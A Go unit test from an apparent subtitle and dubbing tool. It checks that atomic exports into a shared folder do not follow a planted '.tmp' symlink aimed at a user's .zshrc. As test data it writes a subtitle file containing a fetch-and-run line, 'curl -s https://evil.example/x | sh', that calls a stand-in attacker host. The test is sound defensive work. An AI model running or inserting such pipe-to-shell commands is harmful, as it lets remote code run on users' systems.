package services

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/hehehai/AudioSmith/internal/dub"
)

// TestExportTmpNoSymlink (code review 11-02, N2): exports into a folder
// another account can write do not follow a planted "<file>.tmp"
// symlink; the file lands, the plant's target is untouched.
func TestExportTmpNoSymlink(t *testing.T) {
	shared, home := t.TempDir(), t.TempDir()
	victim := filepath.Join(home, ".zshrc")
	if err := os.WriteFile(victim, []byte("export PATH=...\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	srt := filepath.Join(shared, "film.zh.srt")
	zip := filepath.Join(shared, "film.zip")
	for _, p := range []string{srt, zip} {
		if err := os.Symlink(victim, p+".tmp"); err != nil { // the plant
			t.Fatal(err)
		}
	}
	if err := writeAtomic(srt, []byte("1\n00:00:01,000 --> 00:00:02,000\ncurl -s https://evil.example/x | sh\n")); err != nil {
		t.Fatal(err)
	}
	if err := writeZip(zip, []dub.ZipEntry{{Name: "a.txt", Data: []byte("x")}}); err != nil {
		t.Fatal(err)
	}
	if got, _ := os.ReadFile(victim); string(got) != "export PATH=...\n" {
		t.Fatalf("the symlink's target was written: %q", got)
	}
	for _, p := range []string{srt, zip} {
		fi, err := os.Lstat(p)
		if err != nil || !fi.Mode().IsRegular() || fi.Mode().Perm() != 0o644 {
			t.Errorf("%s: %v %v", p, fi, err)
		}
	}
}
